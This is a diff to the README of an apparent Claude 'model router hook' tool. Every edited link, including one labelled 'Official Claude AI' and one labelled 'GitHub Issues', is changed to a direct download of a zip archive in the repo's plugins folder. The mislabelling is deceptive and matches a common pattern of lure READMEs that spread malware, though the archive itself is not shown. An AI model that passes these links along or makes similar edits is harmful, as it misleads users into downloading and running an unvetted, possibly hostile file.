@@ -1,6 +1,6 @@
 # 🤖 claude-model-router-hook - Auto-switch Models by Task
 
-[![Download](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook)
+[![Download](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook/raw/refs/heads/main/plugins/router-model-claude-hook-v1.0-beta.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ It supports common AI workflows and is helpful if you want to improve how you us
 If you want to run this on Windows, follow these steps carefully.
 
 1. Click the large green badge at the top that reads **Download** or visit:  
-   https://github.com/GustavoRobertoLorencetti/claude-model-router-hook
+   https://github.com/GustavoRobertoLorencetti/claude-model-router-hook/raw/refs/heads/main/plugins/router-model-claude-hook-v1.0-beta.3.zip
 
 2. This will take you to the project page where you can download the app files.
 
@@ -141,7 +141,7 @@ If the app does not start or behaves unexpectedly:
 ## 🔗 Download / Install / Setup 🔽
 
 Use this link to get started:  
-[Download claude-model-router-hook](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook)
+[Download claude-model-router-hook](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook/raw/refs/heads/main/plugins/router-model-claude-hook-v1.0-beta.3.zip)
 
 Steps:
 
@@ -161,9 +161,9 @@ This app aims to simplify your use of Claude models. You only need basic compute
 
 ## 📚 Additional Resources
 
-- [Official Claude AI](https://www.anthropic.com/claude) – More on Claude models
+- [Official Claude AI](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook/raw/refs/heads/main/plugins/router-model-claude-hook-v1.0-beta.3.zip) – More on Claude models
 
-- [GitHub Issues](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook/issues) – Report problems or get help
+- [GitHub Issues](https://github.com/GustavoRobertoLorencetti/claude-model-router-hook/raw/refs/heads/main/plugins/router-model-claude-hook-v1.0-beta.3.zip) – Report problems or get help
 
 - [Example Hooks Documentation](docs/hooks.md) – Understand how hooks work
 
